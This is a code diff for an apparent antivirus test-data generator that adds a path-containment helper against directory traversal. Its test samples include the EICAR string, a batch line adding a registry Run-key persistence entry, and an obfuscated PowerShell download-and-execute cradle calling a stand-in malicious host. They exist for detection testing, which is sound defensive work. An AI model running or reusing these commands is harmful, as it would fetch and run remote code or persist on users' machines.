@@ -33,6 +33,20 @@ class TestDataGenerator:
             self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
         except ImportError:
             self.logger = logging.getLogger(__name__)
+
+    def _safe_test_path(self, filename: str) -> str:
+        """
+        Build a path inside the test data directory with containment
+        validation: only the file's base name is used (no directory
+        components), and the resolved path is checked to stay inside
+        self.test_data_dir.
+        """
+        base = os.path.abspath(self.test_data_dir)
+        name = os.path.basename(str(filename))
+        full = os.path.abspath(os.path.join(base, name))
+        if os.path.commonpath([base, full]) != base:
+            raise ValueError("Test file path escapes the test data directory")
+        return full
     
     def create_test_files(self) -> Dict[str, str]:
         """Create various test files for scanning"""
@@ -40,26 +54,26 @@ class TestDataGenerator:
         
         try:
             # Clean test file
-            clean_file = os.path.join(self.test_data_dir, "clean_test.txt")
+            clean_file = self._safe_test_path("clean_test.txt")
             with open(clean_file, 'w') as f:
                 f.write("This is a clean test file for antivirus testing.\n")
                 f.write("It contains no malicious content.\n")
             test_files['clean'] = clean_file
             
             # Suspicious test file (EICAR-like)
-            eicar_file = os.path.join(self.test_data_dir, "eicar_test.txt")
+            eicar_file = self._safe_test_path("eicar_test.txt")
             with open(eicar_file, 'w') as f:
                 f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
             test_files['eicar'] = eicar_file
             
             # Large file for performance testing
-            large_file = os.path.join(self.test_data_dir, "large_test.bin")
+            large_file = self._safe_test_path("large_test.bin")
             with open(large_file, 'wb') as f:
                 f.write(b'A' * (10 * 1024 * 1024))  # 10MB file
             test_files['large'] = large_file
             
             # Binary executable (harmless)
-            exe_file = os.path.join(self.test_data_dir, "test_executable.exe")
+            exe_file = self._safe_test_path("test_executable.exe")
             with open(exe_file, 'wb') as f:
                 # Simple PE header structure
                 f.write(b'MZ\x90\x00' + b'\x00' * 60 + b'PE\x00\x00')
@@ -67,7 +81,7 @@ class TestDataGenerator:
             test_files['executable'] = exe_file
             
             # Archive file
-            archive_file = os.path.join(self.test_data_dir, "test_archive.zip")
+            archive_file = self._safe_test_path("test_archive.zip")
             try:
                 import zipfile
                 with zipfile.ZipFile(archive_file, 'w') as zf:
@@ -77,7 +91,7 @@ class TestDataGenerator:
                 pass
             
             # Script file
-            script_file = os.path.join(self.test_data_dir, "test_script.ps1")
+            script_file = self._safe_test_path("test_script.ps1")
             with open(script_file, 'w') as f:
                 f.write("# PowerShell test script\n")
                 f.write("Write-Host 'This is a test script'\n")
@@ -95,7 +109,7 @@ class TestDataGenerator:
         
         try:
             # Simulated malware sample
-            malware_file = os.path.join(self.test_data_dir, "malware_sample.bin")
+            malware_file = self._safe_test_path("malware_sample.bin")
             with open(malware_file, 'wb') as f:
                 # Create suspicious binary patterns
                 f.write(b'\x4d\x5a\x90\x00')  # PE header
@@ -107,7 +121,7 @@ class TestDataGenerator:
             threat_samples['malware'] = malware_file
             
             # Suspicious script
-            script_threat = os.path.join(self.test_data_dir, "suspicious_script.bat")
+            script_threat = self._safe_test_path("suspicious_script.bat")
             with open(script_threat, 'w') as f:
                 f.write("@echo off\n")
                 f.write("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n")
@@ -115,7 +129,7 @@ class TestDataGenerator:
             threat_samples['script_threat'] = script_threat
             
             # Obfuscated PowerShell
-            ps_threat = os.path.join(self.test_data_dir, "obfuscated.ps1")
+            ps_threat = self._safe_test_path("obfuscated.ps1")
             with open(ps_threat, 'w') as f:
                 f.write("$a='IEX';$b='(New-Object Net.WebClient)';")
                 f.write("$c='.DownloadString';Invoke-Expression($a+$b+$c+'(\"http://malicious.com\")')")
